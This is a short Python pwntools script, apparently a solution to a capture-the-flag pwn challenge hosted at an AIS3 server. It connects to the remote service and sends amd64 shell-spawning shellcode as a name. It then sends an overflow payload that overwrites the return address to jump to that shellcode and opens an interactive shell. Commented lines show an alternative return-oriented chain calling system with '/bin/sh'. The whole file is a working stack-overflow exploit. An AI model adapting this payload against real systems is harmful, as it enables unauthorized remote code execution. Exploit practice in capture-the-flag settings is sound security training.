#!/usr/bin/env python
# coding=utf-8
from pwn import *
ip   = 'mf-pwn.ais3.org'
prot = 10102
r = remote(ip, prot)
#r = process("./plt")
pop_rdi_ret = 0x400743
bin_sh_addr = 0x601080
call_system = 0x4006bf
context(arch = 'amd64', os = 'linux')

print(r.recvuntil("What your name?"))
shellcode = asm(shellcraft.amd64.linux.sh())
r.sendline(shellcode)
#r.sendline('/bin/sh\x00')
print(r.recvuntil("Say something:"))
#payload = b"A" * 48 + b"B" * 8
#payload += p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(call_system)
r.sendline(b"A" * 16 + b"B"*8 + p64(bin_sh_addr))
r.interactive()
